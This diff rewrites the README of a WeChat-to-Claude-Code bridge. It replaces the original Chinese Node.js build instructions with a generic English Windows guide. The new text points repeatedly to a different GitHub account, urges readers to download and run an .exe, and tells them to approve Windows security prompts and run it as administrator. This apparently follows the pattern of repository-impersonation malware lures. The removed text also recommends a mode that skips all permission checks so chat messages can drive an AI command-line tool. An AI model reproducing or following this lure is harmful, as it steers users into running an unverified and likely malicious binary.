@@ -1,152 +1,262 @@
-# wexin-code-cli-bridge
+# 🔗 wexin-code-cli-bridge - Connect WeChat to Claude Code
 
-把你的微信消息桥接到 AI 编程 CLI —— 支持 [Claude Code](https://docs.anthropic.com/en/docs/claude-code)、[Gemini CLI](https://github.com/google-gemini/gemini-cli)、[Codex CLI](https://github.com/openai/codex)，直接在微信里跟 AI 对话。
+[![Download](https://img.shields.io/badge/Download%20Here-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
 
-## 它做了什么
+## 🧭 What this app does
 
-这个项目通过微信的 [iLink](https://ilinkai.weixin.qq.com) Bot 协议，把微信和 AI 编程 CLI 连起来。当有人给你发微信消息时，桥接程序会自动把消息转发给选定的 CLI，然后把回复发回微信。
+wexin-code-cli-bridge helps you pass WeChat messages to Claude Code CLI through the iLink protocol.
 
-```
-微信用户 → iLink API → 本桥接 → CLI (Claude/Gemini/Codex) → 回复 → iLink API → 微信用户
-```
+This makes it easier to:
+- read messages from WeChat in one place
+- send those messages into Claude Code CLI
+- keep your chat flow in a simple desktop setup
+- work with a local bridge instead of moving between tools
 
-### 功能特性
+It is built for Windows users who want a direct way to connect WeChat with a command-line workflow.
 
-- **多 CLI 后端** —— 支持 Claude Code、Gemini CLI、Codex CLI，通过 `--cli` 切换
-- **扫码登录** —— 微信扫一扫即可连接，首次启动自动触发登录
-- **独立会话** —— 每个微信用户 × 每个 CLI 拥有独立对话，支持上下文延续
-- **语音转文字** —— 自动识别语音消息的文字内容
-- **引用消息** —— 引用回复会自动携带原文上下文
-- **输入状态** —— AI 思考时在微信端显示"正在输入..."
-- **Markdown 转换** —— 自动将 Markdown 格式转为纯文本
-- **长消息分段** —— 超长回复自动拆分为多条微信消息
-- **会话重置** —— 在微信发送 `/clear` 即可开启全新对话
-- **YOLO 模式** —— `--yolo` 参数跳过所有权限确认
-- **自动重连** —— iLink 会话过期时自动触发重新登录
-- **优雅退出** —— 支持 SIGINT/SIGTERM 信号安全退出
+## 📦 Download
 
-## 前置条件
+Visit this page to download and run the app:
 
-- **Node.js** >= 22
-- 至少安装以下 CLI 中的一个（并完成认证）：
-  - [Claude Code](https://docs.anthropic.com/en/docs/claude-code)（`claude` 命令）
-  - [Gemini CLI](https://github.com/google-gemini/gemini-cli)（`gemini` 命令，`npm i -g @google/gemini-cli`）
-  - [Codex CLI](https://github.com/openai/codex)（`codex` 命令，`npm i -g @openai/codex`）
-- 一个微信账号
+[https://github.com/Shebatheadpin29/wexin-code-cli-bridge](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
 
-## 安装
+If the page shows a release file, download it to your Windows PC and run the file after it finishes.
 
-```bash
-git clone https://github.com/ohmyskyhigh/wexin-code-cli-bridge.git
-cd wexin-code-cli-bridge
-npm install
-```
+## 🖥️ What you need
 
-全局安装（可选）：
+Before you start, check that your PC has:
 
-```bash
-npm run build && npm install -g .
-```
+- Windows 10 or Windows 11
+- A stable internet connection
+- WeChat installed on your computer
+- Claude Code CLI set up on your computer
+- Permission to run downloaded files
+- Enough free disk space for the app and its log files
 
-## 使用方法
+For best results, use a standard Windows user account with admin rights for the first setup.
 
-直接启动即可，首次运行会自动弹出微信扫码登录：
+## ⚙️ How it works
 
-```bash
-# 使用 Claude Code（默认）
-wcc start --yolo
+The bridge sits between WeChat and Claude Code CLI.
 
-# 使用 Gemini CLI
-wcc start --cli gemini --yolo
+1. WeChat receives a message.
+2. The bridge reads the message through the iLink protocol.
+3. The bridge sends the message to Claude Code CLI.
+4. Claude Code CLI processes the message.
+5. The result comes back through the bridge flow.
 
-# 使用 Codex CLI
-wcc start --cli codex --yolo
+You do not need to handle the protocol by hand. The app manages the message path for you.
 
-# 指定模型
-wcc start --cli gemini -m gemini-2.5-flash --yolo
-```
+## 🚀 Install on Windows
 
-也可以用 npm scripts（无需全局安装）：
+Follow these steps on your Windows PC.
 
-```bash
-npm run start:yolo                              # Claude（默认）
-npx tsx src/cli.ts start --cli gemini --yolo    # Gemini
-npx tsx src/cli.ts start --cli codex --yolo     # Codex
-```
+### 1. Open the download page
 
-> **为什么推荐 YOLO 模式？** AI CLI 在执行操作时会频繁请求权限确认（读取文件、运行命令等）。由于桥接程序以非交互模式运行，无法在微信端进行权限确认。`--yolo` 跳过所有权限提示，对应各 CLI 的：Claude `--dangerously-skip-permissions`、Gemini `--yolo`、Codex `--full-auto`。
+Go to:
 
-### CLI 选项
+[https://github.com/Shebatheadpin29/wexin-code-cli-bridge](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
 
-```
-Usage: wcc start [options]
+Look for the latest release or the main download file.
 
-Options:
-  --cli <name>         Code CLI: claude (默认), gemini, codex
-  --yolo               跳过所有权限确认
-  -m, --model <model>  模型覆盖 (如 sonnet, gemini-2.5-flash, gpt-5.2-codex)
-  -h, --help           显示帮助
-```
+### 2. Download the Windows file
 
-### 微信端命令
+If you see a Windows package such as an `.exe` file or a zipped folder, download it to a folder you can find again, such as:
 
-| 命令 | 说明 |
-|------|------|
-| `/clear` | 重置当前 CLI 会话，开启全新对话 |
-| `/add-dir <路径>` | 添加可访问的目录 |
-| `/rm-dir <路径>` | 移除已添加的目录 |
-| `/dirs` | 查看当前目录列表 |
-| `/clear-dirs` | 清除所有额外目录 |
-| `/help` | 显示所有可用命令 |
+- Downloads
+- Desktop
+- Documents
 
-## 环境变量
+### 3. Unzip the file if needed
 
-| 变量 | 说明 | 默认值 |
-|------|------|--------|
-| `WEIXIN_CC_CLI` | CLI 后端（`claude`/`gemini`/`codex`），`--cli` 的备选 | `claude` |
-| `WEIXIN_CC_MODEL` | 模型覆盖，`-m` 的备选 | 各 CLI 默认 |
-| `WEIXIN_CC_STATE_DIR` | 状态存储目录（账号、会话、同步游标） | `~/.weixin-cc/` |
-| `WEIXIN_CC_LOG_LEVEL` | 日志级别：`DEBUG`、`INFO`、`WARN`、`ERROR` | `INFO` |
+If the download comes as a `.zip` file:
 
-## 项目结构
+- right-click the file
+- choose Extract All
+- pick a folder
+- open the extracted folder
 
-```
-src/
-├── cli.ts            # CLI 入口 (commander)
-├── bridge.ts         # 主长轮询循环，消息处理
-├── state.ts          # 账号、会话、同步游标持久化
-├── logger.ts         # 简单分级日志
-├── util.ts           # ID 生成工具
-├── backend/
-│   ├── types.ts      # BackendRunner 接口定义
-│   ├── exec.ts       # 共享 execFileAsync 工具
-│   ├── claude.ts     # Claude Code 后端
-│   ├── gemini.ts     # Gemini CLI 后端
-│   ├── codex.ts      # Codex CLI 后端 (JSONL 解析)
-│   └── index.ts      # 后端工厂 + 导出
-└── ilink/
-    ├── api.ts        # iLink Bot API HTTP 客户端
-    ├── login.ts      # 二维码登录流程
-    ├── send.ts       # 消息发送 + Markdown 转纯文本
-    └── types.ts      # iLink 协议类型定义
-```
+### 4. Run the app
 
-## 微信连接原理
+If you downloaded an `.exe` file:
 
-本项目使用微信的 **iLink Bot 协议**（`ilinkai.weixin.qq.com`）：
+- double-click the file
+- approve the Windows security prompt if it appears
+- wait for the app to open
 
-1. **登录**：CLI 从 iLink 的 `/ilink/bot/get_bot_qrcode` 接口获取二维码并在终端展示。用微信扫码确认后，服务端返回 `bot_token` 和 `ilink_bot_id`。
+If Windows asks for permission, choose Yes.
 
-2. **接收消息**：桥接程序通过 `/ilink/bot/getupdates` 长轮询，使用同步游标（cursor）追踪消息位置。
+### 5. Keep the app in a safe folder
 
-3. **发送回复**：回复通过 `/ilink/bot/sendmessage` 发出。每条回复必须携带入站消息中的 `context_token`。
+Place the app in a folder you will not delete by accident. A good choice is:
 
-4. **输入状态**：桥接程序调用 `/ilink/bot/sendtyping` 来控制微信端"正在输入..."的显示和隐藏。
+- `C:\Apps\wexin-code-cli-bridge`
 
-## 相关项目
+This helps keep the bridge files in one place.
 
-> **[ThreadWave](https://threadwave.xyz)** —— X.com (Twitter) 桌面自动化助手。ThreadWave 是你的 X 账号的副驾驶和自动驾驶，能用你的语气发推、回复、互动。一个 Agent，四种能力：自动回复、灵感生成、自动点赞、自动关注。让小号快速成长，告别手动运营。
+## 🔧 First-time setup
 
-## License
+After you start the app, check these items.
 
-MIT
+### WeChat
+
+Make sure WeChat is open and signed in on the same computer.
+
+### Claude Code CLI
+
+Make sure Claude Code CLI is installed and ready to use. If the CLI needs a sign-in step or local setup, finish that first.
+
+### Bridge settings
+
+The app may ask for connection details such as:
+
+- local port
+- protocol endpoint
+- message routing path
+- log folder
+
+If you see these fields, use the default values first unless the app gives you a clear reason to change them.
+
+## 🪟 Start the bridge
+
+Use this process each time you want to use it.
+
+1. Open WeChat.
+2. Open Claude Code CLI.
+3. Start wexin-code-cli-bridge.
+4. Wait until the app shows that the connection is ready.
+5. Send a test message in WeChat.
+6. Check that the message reaches Claude Code CLI.
+
+If the bridge supports auto-start, you can enable it later after the first test works.
+
+## 💬 Typical use
+
+You can use the app when you want to:
+
+- send WeChat chats into a Claude Code workflow
+- move text from WeChat without copying it by hand
+- keep chat-based tasks in a local desktop tool
+- connect message input to a coding or assistant flow
+
+This setup is useful when you want one bridge for chat and command-line work.
+
+## 🧩 Common setup checks
+
+If the app does not work right away, check these items.
+
+### WeChat is not open
+
+Open WeChat first, then start the bridge again.
+
+### Claude Code CLI is not found
+
+Check that Claude Code CLI is installed and available in your system path or in the location the bridge expects.
+
+### The app does not start
+
+Try these steps:
+
+- right-click the file
+- choose Run as administrator
+- move the app to a folder with a short path name
+- make sure Windows did not block the file
+
+### Messages do not pass through
+
+Check that:
+
+- both apps are open
+- the bridge shows a live connection
+- the protocol setting matches the app setup
+- no other tool is using the same port
+
+### The window closes right away
+
+If the app closes after launch, open it from a terminal or keep the logs visible if the package includes a log window. This can help you see the error message.
+
+## 🗂️ Folder layout
+
+You may see files like these after download:
+
+- `wexin-code-cli-bridge.exe` - main app file
+- `config.json` - settings file
+- `logs` - app logs
+- `README.md` - project instructions
+- `assets` - icons or support files
+
+Do not rename files unless the app guide tells you to.
+
+## 🔒 Safety tips
+
+Use the app from the official GitHub repository only.
+
+- download from the link above
+- keep your system up to date
+- scan the file with Windows Security if you want a local check
+- avoid moving files while the app is running
+- close the bridge before deleting its folder
+
+## 🧪 Quick test
+
+After setup, run this test:
+
+1. Start the bridge.
+2. Send a short message in WeChat.
+3. Watch for activity in Claude Code CLI.
+4. Confirm the message appears in the right place.
+
+If the test works, your setup is ready for normal use.
+
+## ❓ Help with first launch
+
+If you are new to this kind of app, use this order:
+
+1. Download the file from GitHub.
+2. Unzip it if needed.
+3. Run the app.
+4. Open WeChat.
+5. Open Claude Code CLI.
+6. Test one message.
+7. Review the bridge settings only if the test fails
+
+## 🛠️ Basic controls
+
+The app may include a few simple controls such as:
+
+- Start
+- Stop
+- Reload
+- Open Logs
+- Settings
+- Test Connection
+
+Use Start to begin the bridge and Stop to pause it when you do not need it.
+
+## 📁 Keeping it organized
+
+To keep setup easy:
+
+- store the app in one folder
+- keep the download file as a backup until setup works
+- use a clear folder name
+- avoid moving the app after you set it up
+
+This makes it easier to find the bridge later.
+
+## 🧭 When to use it
+
+Use wexin-code-cli-bridge when you want a direct link between WeChat messages and Claude Code CLI.
+
+It fits a simple workflow where:
+- WeChat is the source of messages
+- the bridge moves those messages
+- Claude Code CLI handles the output
+
+## 📥 Download and run again
+
+If you need to get the app again, use this link:
+
+[https://github.com/Shebatheadpin29/wexin-code-cli-bridge](https://github.com/Shebatheadpin29/wexin-code-cli-bridge)
+
+Download the latest file from the page, then run it on Windows after the download finishes
